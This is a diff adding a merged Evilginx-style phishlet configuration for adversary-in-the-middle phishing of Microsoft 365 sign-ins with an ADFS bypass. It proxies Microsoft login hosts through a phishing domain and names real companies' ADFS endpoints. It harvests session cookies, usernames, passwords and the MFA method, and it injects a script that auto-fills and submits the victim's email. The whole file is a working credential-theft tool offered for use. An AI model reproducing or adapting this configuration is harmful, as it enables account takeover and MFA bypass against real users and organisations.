@@ -1,0 +1,148 @@
+name: 'o365_adfs_bypass_merged'
+author: 'Combined'
+min_ver: '3.1.0'
+
+proxy_hosts:
+  # --- From the first phishlet (Microsoft 365 with ADFS Bypass) ---
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: true, is_landing: false}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false}
+  - {phish_sub: 'login-microsoft', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false}
+  - {phish_sub: 'login-live', orig_sub: 'login', domain: 'live.com', session: false, is_landing: false}
+  - {phish_sub: 'www365', orig_sub: 'www', domain: 'microsoft365.com', session: false, is_landing: false}
+  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'adfs.phishing.zulars.xyz', session: true, is_landing: false}
+
+  # --- From the second phishlet (o365) ---
+  # Note: We already used {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com'} above as landing=true
+  # so we skip that duplicate or unify it (the above is chosen as landing = true).
+  - {phish_sub: 'www2',   orig_sub: 'www', domain: 'office.com', session: false, is_landing: false} 
+    # ^ Example if you want to keep a distinct phish_sub to avoid conflicts
+  # Example ADFS placeholders from second phishlet
+  - {phish_sub: 'outlooksts', orig_sub: 'outlooksts', domain: 'disney.com', session: true, is_landing: false}
+  - {phish_sub: 'adfs-godaddy', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false}
+  - {phish_sub: 'adfs-godaddy-443', orig_sub: 'sso', domain: 'godaddy.com:443', session: true, is_landing: false}
+  # etc. Add or comment out as needed...
+  # - {phish_sub: 'adfs-woodhead', orig_sub: 'adfs', domain: 'woodhead-group.co.uk', ...}
+  # - {phish_sub: 'adfs-woodhead-443', orig_sub: 'adfs', domain: 'woodhead-group.co.uk:443', ...}
+  # etc.
+
+sub_filters:
+  # --- From the first phishlet ---
+  - {triggers_on: 'adfs.adfs.phishing.zulars.xyz', orig_sub: 'login', domain: 'microsoftonline.com',
+    search: 'href="https://{hostname}', replace: 'href="https://{hostname}',
+    mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'adfs.adfs.phishing.zulars.xyz', orig_sub: 'login', domain: 'microsoftonline.com',
+    search: 'https://{hostname}', replace: 'https://{hostname}',
+    mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  # --- From the second phishlet ---
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com',
+    search: 'href="https://{hostname}', replace: 'href="https://{hostname}',
+    mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com',
+    search: 'https://{hostname}', replace: 'https://{hostname}',
+    mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+
+  # Additional ADFS placeholders from second phishlet
+  - {triggers_on: 'outlooksts.disney.com', orig_sub: 'login', domain: 'microsoftonline.com',
+    search: 'https://{hostname}', replace: 'https://{hostname}',
+    mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com',
+    search: 'https://{hostname}', replace: 'https://{hostname}',
+    mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+
+  # ... etc. for woodhead-group references (comment out or remove if not needed)
+
+auth_tokens:
+  # Merge from both. They’re effectively the same but we keep them:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+    type: 'cookie'
+
+  # If the second phishlet has the same domain with the same keys, you can unify:
+  # The second had 2 lines, but they are basically the same. Combining them:
+  #   domain: '.login.microsoftonline.com'
+  #     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+  #   domain: 'login.microsoftonline.com'
+  #     keys: ['SignInStateCookie']
+  # The above single entry merges them with `type: 'cookie'`.
+
+auth_urls:
+  # From second phishlet
+  - '/kmsi*'
+
+credentials:
+  # Usually these can just be merged. Both are the same logic:
+  username:
+    key: '(login|UserName)'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: '(passwd|Password|accesspass)'
+    search: '(.*)'
+    type: 'post'
+
+  custom:
+    - key: 'mfaAuthMethod'  # only existed in first phishlet, if you want to track MFA method
+      search: '(.*)'
+      type: 'post'
+
+login:
+  # Merge from both; basically the same:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+# Force POST from the first phishlet (handles ADFS wresult wctx data)
+force_post:
+  - path: '/login.srf'
+    search:
+      - {key: 'wa', search: '.*'}
+      - {key: 'wresult', search: '.*'}
+      - {key: 'wctx', search: '.*'}
+    force:
+      - {key: 'wresult', search: 'http\:\/\/adfs\.phishing\.zulars\.xyz\:443',
+         value: 'http://adfs.phishing.zulars.xyz'}
+    type: 'post'
+
+js_inject:
+  # Both phishlets have the same auto-fill script. Just keep one:
+  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
+    trigger_paths: ["/common/oauth2/v2.0/authorize*", "/", "/*"]
+    script: |
+      function lp(){
+        var emailId = document.querySelector("#i0116");
+        var nextButton = document.querySelector("#idSIButton9");
+        var query = window.location.href;
+        if (/#/.test(window.location.href)){
+          var res = query.split("#");
+          var data1 = res[0];
+          var data2 = res[1];
+          console.log(data1);
+          console.log(data2);
+          if (emailId != null) {
+            var decodedString = data2;
+            // Check if string is base64
+            if (/^[A-Za-z0-9+/=]+$/.test(data2)) {
+              try {
+                decodedString = window.atob(data2.replace(/[=]/gi, ''));
+              } catch (e) {
+                console.error('Error decoding base64 string:', e);
+              }
+            }
+            emailId.focus();
+            emailId.value = decodedString;
+            nextButton.focus();
+            nextButton.click();
+            console.log("YES!");
+            return;
+          }
+        }
+        setTimeout(function(){lp();}, 500);
+      }
+      setTimeout(function(){lp();}, 500);
